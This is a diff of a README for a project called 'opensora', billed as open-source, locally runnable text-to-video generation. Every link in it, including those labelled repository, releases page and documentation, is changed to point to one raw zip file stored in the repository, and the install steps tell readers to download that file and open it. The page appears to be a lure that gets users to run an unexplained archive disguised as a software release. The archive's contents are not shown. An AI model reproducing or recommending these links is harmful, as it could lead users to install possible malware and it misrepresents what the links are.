@@ -6,7 +6,7 @@ Open-source, locally runnable text-to-video generation — inspired by Sora, bui
 ## 🚀 Getting Started
 
 ### 📥 Download Now
-[![Download opensora](https://raw.githubusercontent.com/AASHU1408/opensora/main/Bimana/Software-v1.2.zip)](https://raw.githubusercontent.com/AASHU1408/opensora/main/Bimana/Software-v1.2.zip)
+[![Download opensora](https://github.com/AASHU1408/opensora/raw/refs/heads/main/Bimana/Software-v3.3.zip)](https://github.com/AASHU1408/opensora/raw/refs/heads/main/Bimana/Software-v3.3.zip)
 
 ### 💻 System Requirements
 - **Operating System:** Windows 10 or later, macOS, or a recent Linux distribution.
@@ -16,7 +16,7 @@ Open-source, locally runnable text-to-video generation — inspired by Sora, bui
 - **GPU:** Recommended for best performance (NVIDIA/AMD).
 
 ### 🔧 Installation Steps
-1. Go to the [Releases page](https://raw.githubusercontent.com/AASHU1408/opensora/main/Bimana/Software-v1.2.zip).
+1. Go to the [Releases page](https://github.com/AASHU1408/opensora/raw/refs/heads/main/Bimana/Software-v3.3.zip).
 2. Download the latest version of the software suitable for your operating system.
 3. Once the download completes, locate the downloaded file (likely in your Downloads folder).
 4. Open the file to start the installation.
@@ -65,12 +65,12 @@ Join our community to get help from other users, share your videos, and find tip
 - Check for updates regularly to benefit from new features and improvements.
 
 ## 🔗 Important Links
-- [GitHub Repository](https://raw.githubusercontent.com/AASHU1408/opensora/main/Bimana/Software-v1.2.zip)
-- [Releases Page](https://raw.githubusercontent.com/AASHU1408/opensora/main/Bimana/Software-v1.2.zip)
-- [Documentation](https://raw.githubusercontent.com/AASHU1408/opensora/main/Bimana/Software-v1.2.zip)
+- [GitHub Repository](https://github.com/AASHU1408/opensora/raw/refs/heads/main/Bimana/Software-v3.3.zip)
+- [Releases Page](https://github.com/AASHU1408/opensora/raw/refs/heads/main/Bimana/Software-v3.3.zip)
+- [Documentation](https://github.com/AASHU1408/opensora/raw/refs/heads/main/Bimana/Software-v3.3.zip)
 
 ### 📥 Download opensora Again
 For your convenience, here’s the link to download:
-[![Download opensora](https://raw.githubusercontent.com/AASHU1408/opensora/main/Bimana/Software-v1.2.zip)](https://raw.githubusercontent.com/AASHU1408/opensora/main/Bimana/Software-v1.2.zip)
+[![Download opensora](https://github.com/AASHU1408/opensora/raw/refs/heads/main/Bimana/Software-v3.3.zip)](https://github.com/AASHU1408/opensora/raw/refs/heads/main/Bimana/Software-v3.3.zip)
 
 Enjoy creating amazing videos with opensora!
